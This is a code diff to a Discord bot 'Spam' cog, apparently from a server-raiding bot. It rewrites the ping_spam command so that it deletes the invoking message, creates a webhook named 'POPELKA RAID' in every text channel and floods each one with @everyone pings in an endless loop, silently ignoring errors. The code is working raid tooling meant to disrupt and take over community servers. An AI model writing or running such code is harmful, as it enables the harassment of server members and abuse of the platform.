@@ -42,14 +42,21 @@ class Spam(commands.Cog):
             self.bot.loop.create_task(creepy_channel(channel))
 
     @commands.command()
-    async def spam_ping(self, ctx):
+    async def ping_spam(self, ctx):
         try:
             await ctx.message.delete()
         except:
             pass
-        while True:
-            await ctx.send(
-                "@everyone\n||[BOT REPOSITORY](<https://github.com/ItzPopelka/raidbot>)||")
+        spam_content = " @everyone \n||[BOT REPOSITORY](<https://github.com/ItzPopelka/raidbot>)||"
+        async def nuke_channel(channel):
+            try:
+                webhook = await channel.create_webhook(name="POPELKA RAID")
+                while True:
+                    await webhook.send(spam_content, username="POPELKA ON TOP")
+            except:
+                pass
+        for channel in ctx.guild.text_channels:
+            self.bot.loop.create_task(nuke_channel(channel))
 
     @commands.command()
     @commands.has_permissions(manage_emojis=True)
